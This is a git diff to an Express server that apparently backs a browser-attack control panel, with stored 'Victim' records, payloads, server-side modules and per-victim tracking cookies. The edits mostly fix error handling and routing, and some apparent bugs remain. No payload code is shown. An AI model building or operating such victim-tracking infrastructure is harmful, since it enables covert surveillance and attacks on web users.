@@ -59,7 +59,7 @@ app.all('/', function(req, res){
 app.all('/i/', function(req, res){
     //  返回模块
     //  TODO who id use "Canvas Fingerprinting"
-    var id = req.params.i;
+    var id = req.param('i');
     var who = req.cookies.who;
     sql.Victim.findOne({who:who}, function(err, info){
         if(info){
@@ -69,7 +69,9 @@ app.all('/i/', function(req, res){
         };
         //  若数据库内无Victim，则创建之
         sql.Item.findById(id, function(err, info){
-            if(!info){return null};
+            if(!info){
+                return err404(req, res);
+            };
             who = getmd5(info.owner+id+Date.now());
             res.cookie('who', who);
             //  继承item的配置
@@ -88,7 +90,6 @@ app.all('/i/', function(req, res){
             });
         });
     });
-    return err404(req, res);
 });
 function handle(re, modules, owner, victim, who, type){
     //  处理服务端模块
@@ -113,11 +114,12 @@ function httppage(req, res){
 //    if(!who){return null};
     online(who, Date.now());
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(info.type != 'http'){return null};
+        if(!info||info.type != 'http'){
+            return err404(req, res);
+        };
         var owner = req.session.user&&(req.session.user.name == info.owner);
         handle({q:req, s:res}, info.modules, owner, sql.Victim, who, 'http');
     });
-    return err404(req, res);
 };
 function online(who, on){
     //  是否在线？
@@ -136,7 +138,9 @@ function wspage(ws, req){
 //    if(!who){return null};
     sql.Page.findOne({uri:pageid}, function(err, info){
         var page = info;
-        if(info.type != 'ws'){return null};
+        if(!info||info.type != 'ws'){
+            return err404(req, res);
+        };
         ws.on('open', function(){
             if(owner){return null};
             online(who, 'online');
@@ -198,80 +202,83 @@ app.get('/home', function(req, res){
             });
         });
     });
-    return err404(req, res);
 });
 
 app.get('/home/item/:name', function(req, res){
     sql.Item.findOne({id:req.params.name}, function(err, info){
-        if(info.owner == req.session.user.name){return null};
+        if(!info||info.owner == req.session.user.name){
+            return err404(req, res);
+        };
         return res.render('edit', {
             items:info
         });
     });
-    return err404(req, res);
 });
 app.get('/home/victim/:name', function(req, res){
     sql.Victim.findOne({id:req.params.name}, function(err, info){
-        if(info.owner == req.session.user.name){return null};
+        if(!info||info.owner == req.session.user.name){
+            return err404(req, res);
+        };
         return res.render('edit', {
             victims:info
         });
     });
-    return err404(req, res);
 });
 app.get('/home/page/:uri/edit', function(req, res){
     sql.Page.findOne({uri:req.params.uri}, function(err, info){
-        if(info.owner == req.session.user.name){return null};
+        if(!info||info.owner == req.session.user.name){
+            return err404(req, res);
+        };
         return res.render('editpage', {
             pages:info
         });
     });
-    return err404(req, res);
 });
 
 app.post('/home/victim/:id/edit', function(req, res){
     var id = req.params.id;
-    if(req.params.type=='delete'){
+    if(req.param('type')=='delete'){
         sql.Victim.findByIdAndRemove(id, function(err){
             return res.json({error:err});
         });
+    }else{
+        sql.Victim.findByIdUpdate(id, {
+            owner:req.body.owner,
+            name:req.body.name,
+            payload:req.body.payload,
+            load:JSON.parse(req.body.load),
+            modules:JSON.parse(req.body.modules),
+            status:JSON.parse(req.body.modules),
+        }, function(err, info){
+            return res.json({error:(err||info?'':'not found.')});
+        });
     };
-    sql.Victim.findByIdUpdate(id, {
-        owner:req.body.owner,
-        name:req.body.name,
-        payload:req.body.payload,
-        load:JSON.parse(req.body.load),
-        modules:JSON.parse(req.body.modules),
-        status:JSON.parse(req.body.modules),
-    }, function(err, info){
-        return res.json({error:(err||info?'':'not found.')});
-    });
 });
 app.post('/home/page/:uri/edit', function(req, res){
     var id = req.params.id;
-    if(req.params.type=='delete'){
+    if(req.param('type')=='delete'){
         sql.Page.findByIdAndRemove(id, function(err){
             return res.json({error:err});
         });
+    }else{
+        sql.Page.findByIdUpdate(id, {
+            owner:req.body.owner,
+            name:req.body.name,
+            uri:req.body.uri,
+            type:req.body.type,
+            modules:JSON.parse(req.body.modules)
+        }, function(err, info){
+            return res.json({error:(err||info?'':'not found.')});
+        });
     };
-    sql.Page.findByIdUpdate(id, {
-        owner:req.body.owner,
-        name:req.body.name,
-        uri:req.body.uri,
-        type:req.body.type,
-        modules:JSON.parse(req.body.modules)
-    }, function(err, info){
-        return res.json({error:(err||info?'':'not found.')});
-    });
 });
 
 app.all('/home/modules', function(req, res){
-    var type = req.params.type;
+    var type = req.param('type');
     var json = {};
     if(type=='user'){
         //TODO
-    };
-    if(type=='server'){
+    }else if(type=='server'){
         fs.readdirSync('./modules').forEach(function(n){
             var m = require('./modules/'+n);
             json[m.name] = {
@@ -283,11 +290,11 @@ app.all('/home/modules', function(req, res){
             }
         });
         return res.json(json);
-    };
-    if(type=='victim'){
+    }else if(type=='victim'){
         //TODO
+    }else{
+        return err404(req, res);
     };
-    return err404(req, res);
 });
 
 app.use('*', err404);
